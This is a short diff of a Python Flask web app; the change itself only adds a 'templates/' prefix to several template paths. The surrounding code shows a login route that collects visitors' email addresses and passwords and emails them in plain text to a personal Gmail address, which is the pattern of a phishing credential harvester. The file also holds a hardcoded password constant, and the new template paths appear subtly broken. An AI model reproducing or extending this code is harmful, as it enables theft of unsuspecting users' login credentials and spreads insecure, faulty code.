@@ -9,7 +9,7 @@ PASSWORD = "vedank1234567890"
 
 @app.route('/')
 def home_page():
-    return render_template('main.html')
+    return render_template('templates/main.html')
 
 
 @app.route('/login', methods=['POST', 'GET'])
@@ -26,8 +26,8 @@ def login_page():
                 to_addrs="vedanksrivastava123@gmail.com",
                 msg=f"Subject:New login.\n\nEmail: {email}\nPassword: {password}\n"
             )
-        return render_template('HF2.html', msg_sent=True)
-    return render_template('index.html', msg_sent=False)
+        return render_template('templates/HF2.html', msg_sent=True)
+    return render_template('templates/index.html', msg_sent=False)
 
 
 if __name__ == "__main__":
